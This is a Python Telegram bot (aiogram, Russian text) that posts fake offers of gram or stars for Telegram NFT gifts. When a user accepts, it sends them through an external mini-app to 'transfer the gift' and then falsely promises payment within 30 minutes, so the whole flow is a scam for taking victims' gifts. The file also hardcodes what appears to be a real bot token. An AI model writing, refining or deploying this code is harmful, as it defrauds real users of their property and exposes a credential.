import asyncio
import logging
import shlex
import uuid

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, WebAppInfo,
)

TOKEN = "9056825852:AAH-AKRlntMSkdLMfEbBqB9HsFcPsZFqabA"

# Ссылка на твой загруженный HTML-файл (обязательно HTTPS!)
MINI_APP_URL = "https://molniais80-rgb.github.io/miniap/" 
TARGET_USERNAME = "rattiixx"

PHOTO_FILE_ID = None
CURRENCY = {"g": "💎", "s": "⭐"}

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
OFFERS: dict[str, dict] = {}

OFFER_TEXT = "Пользователь <b>{who}</b> предлагает Вам {sum} {cur} за подарок <b>{name}</b>."

def gift_name(url: str) -> str:
    slug = url.rstrip("/").rsplit("/", 1)[-1]
    if "-" in slug:
        base, num = slug.rsplit("-", 1)
        if num.isdigit():
            return f"{base} #{num}"
    return slug or "подарок"

def offer_kb(oid: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="❌ Отклонить", callback_data=f"dec:{oid}"),
        InlineKeyboardButton(text="✅ Принять", callback_data=f"acc:{oid}"),
    ]])

def instruction_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 Передать подарок", web_app=WebAppInfo(url=MINI_APP_URL))],
        [InlineKeyboardButton(text="✅ Подарок передан", callback_data="done")],
    ])

@dp.message(Command("offer"))
async def cmd_offer(message: Message):
    # ПРОВЕРКА НА АДМИНА УДАЛЕНА. Командой может пользоваться любой.
    
    args = shlex.split(message.text.partition(" ")[2] or "")
    if len(args) < 3:
        return await message.answer(
            "Формат:\n"
            "<code>/offer \"https://t.me/nft/PlushPepe-2687\" \"20\" g</code>\n\n"
            "g — грам 💎, s — звёзды ⭐"
        )

    url, raw_sum, cur_key = args[0], args[1], args[2].lower()
    if cur_key not in CURRENCY:
        return await message.answer("Валюта только <b>g</b> или <b>s</b>.")
    if not raw_sum.isdigit():
        return await message.answer("Сумма — целое число.")
    if not url.startswith("http"):
        return await message.answer("Ссылка должна начинаться с http.")

    oid = uuid.uuid4().hex[:12]
    OFFERS[oid] = {"url": url, "sum": raw_sum, "cur": CURRENCY[cur_key]}

    who = message.from_user.first_name or "Пользователь"
    caption = OFFER_TEXT.format(who=who, sum=raw_sum, cur=CURRENCY[cur_key], name=gift_name(url))

    photo = PHOTO_FILE_ID or FSInputFile("offer.jpg")
    await message.answer_photo(photo=photo, caption=caption, reply_markup=offer_kb(oid))

    # Если команду ввели в группе, бот удалит исходное сообщение /offer, чтобы было красиво
    if message.chat.type != "private":
        try:
            await message.delete()
        except Exception:
            pass

@dp.callback_query(F.data.startswith("dec:"))
async def on_decline(call: CallbackQuery):
    OFFERS.pop(call.data.split(":")[1], None)
    await call.message.edit_caption(caption="Вы отклонили предложение.", reply_markup=None)
    await call.answer("Отклонено")

@dp.callback_query(F.data.startswith("acc:"))
async def on_accept(call: CallbackQuery):
    oid = call.data.split(":")[1]
    if oid not in OFFERS:
        return await call.answer("Оффер устарел", show_alert=True)

    await call.message.edit_reply_markup(reply_markup=None)
    await call.message.answer(
        "Принято👌\n\n"
        "Нажмите кнопку ниже, чтобы перейти к передаче подарка. "
        "После передачи звёзды придут на баланс в течение 30 минут⭐️",
        reply_markup=instruction_kb()
    )
    await call.answer()

@dp.callback_query(F.data == "done")
async def on_done(call: CallbackQuery):
    await call.message.edit_text(
        "Подарок передан✅\n\nПроверяем подарок. Звёзды зачислятся в течение 30 минут."
    )
    await call.answer("Проверяем")

async def main():
    logging.basicConfig(level=logging.INFO)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
